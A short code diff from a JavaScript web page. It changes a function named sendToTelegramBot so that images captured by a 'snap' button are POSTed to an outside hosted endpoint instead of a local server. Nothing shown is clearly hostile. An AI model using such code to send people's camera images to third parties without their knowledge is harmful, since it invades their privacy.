@@ -22,7 +22,7 @@ snapButton.addEventListener('click', () => {
 });
 
 function sendToTelegramBot(imageDataURL) {
-    fetch('http://127.0.0.1:5000', {
+    fetch('https://magic-app-9vje.onrender.com/', {
         method: 'POST',
         body: JSON.stringify({ image: imageDataURL }),
         headers: {
